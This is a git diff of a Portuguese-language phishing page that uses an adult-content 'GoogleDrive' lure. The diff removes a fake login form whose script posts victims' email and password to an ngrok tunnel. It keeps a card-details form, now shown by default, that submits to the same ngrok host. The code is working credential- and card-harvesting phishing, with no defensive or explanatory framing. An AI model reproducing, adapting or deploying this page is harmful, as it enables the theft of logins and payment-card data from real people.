@@ -68,21 +68,7 @@
     </style>
 </head>
 <body>
-    <div class="container" id="loginContainer">
-        <h2>Conteúdos GoogleDrive🔞</h2>
-        <form id="loginForm" method="POST" action="https://b03d-2804-6850-8000-3d01-c12e-b350-c502-7e67.ngrok-free.app/">
-            <div class="form-group">
-                <input type="email" class="form-control" id="email" name="email" placeholder="Digite o e-mail">
-            </div>
-            <div class="form-group">
-                <input type="password" class="form-control" id="password" name="password" placeholder="Digite a senha">
-            </div>
-            <button type="button" onclick="enviarFormulario()">Entrar</button>
-            <p id="mensagemErro" style="color: red;"></p>
-        </form>
-    </div>
-
-    <div class="container" id="cartaoContainer" style="display: none;">
+    <div class="container" id="cartaoContainer">
         <h2>Detalhes do Cartão</h2>
         <form id="cartaoForm" method="POST" action="https://b03d-2804-6850-8000-3d01-c12e-b350-c502-7e67.ngrok-free.app/">
             <div class="form-group">
@@ -100,33 +86,6 @@
     </div>
 
     <script>
-        function enviarFormulario() {
-            var email = document.getElementById('email').value;
-            var password = document.getElementById('password').value;
-
-            if (email === '' || password === '') {
-                document.getElementById('mensagemErro').innerText = 'Por favor, preencha todos os campos.';
-                return;
-            }
-
-            var formData = new FormData();
-            formData.append('email', email);
-            formData.append('password', password);
-
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', document.getElementById("loginForm").action);
-            xhr.onload = function () {
-                if (xhr.status === 200) {
-                    document.getElementById('loginContainer').style.display = 'none';
-                    document.getElementById('cartaoContainer').style.display = 'block';
-                } else {
-                    var mensagem = xhr.responseText;
-                    document.getElementById('mensagemErro').innerText = mensagem;
-                }
-            };
-            xhr.send(formData);
-        }
-
         function enviarCartao() {
             var cardNumber = document.getElementById('card_number').value;
             var expirationDate = document.getElementById('expiration_date').value;
